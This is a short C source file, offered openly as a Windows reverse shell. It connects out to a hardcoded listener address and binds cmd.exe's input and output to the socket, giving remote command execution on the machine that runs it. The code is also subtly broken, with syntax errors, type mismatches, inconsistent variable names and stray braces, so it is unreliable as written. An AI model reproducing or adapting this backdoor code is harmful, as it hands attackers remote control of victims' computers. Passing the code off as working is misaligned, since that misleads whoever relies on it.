#Reverse shell in c
#For the use , you require to compile the file and start a listener
#on your maquine

#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib,"Ws2_32.lib")

int main(){
	SOCKET shell;
	sockaddr_in shell_addr;
	WSADATA wsa;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char RecvSercer[512];
	char ip_addr[]="192.168.1.93";
	int port="8081";
	int connection;
	
	//INFO ABOUT WSAStartup function:
	//https://learn.microsoft.com/es-es/windows/win32/api/winsock/nf-winsock-wsastartup

	WSAStartup(MAKEWORD(2,2),&wsa); //Initialize WinSock

	shell=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,	(unsigned int) NULL,),(unsigned int) NULL);//CREATE A TCP_SOCKET
	
	shell_addr.sin_port= htons(port);
	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
	
	connect =WSAConnect(shell,(sockaddr*)&shell_addr,sizeof(shell_addr),NULL,NULL,NULL);

	if(connect==SOCKET_ERROR){
		printf("socket ERROR\n");
		exit(0);
	}

	else{
		recv(shell,RecvSercer, sizeof(RecvSercer),0);
		si.cb=sizeof(si);
		si.dwFlags = (STARTF_USESDHANDLES | 					STARTF_USESSHOWWINDOW);
		Si.hStdInput = si.StdOutput= si.hStdError = (HANDLE) 		shell;
		//The Function Create Process recives 3  must 				arguments and 		//5 optional arguments	
		CreateProcess(NULL,"cmd.exe",NULL,NULL, 				TRUE,0,	NULL,NULL,&si,%pi);
	}
	WaitForSingleObject(pi.hProcess,INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	memset(RecvServer,0,sizeof(RecvServer));
	}
}
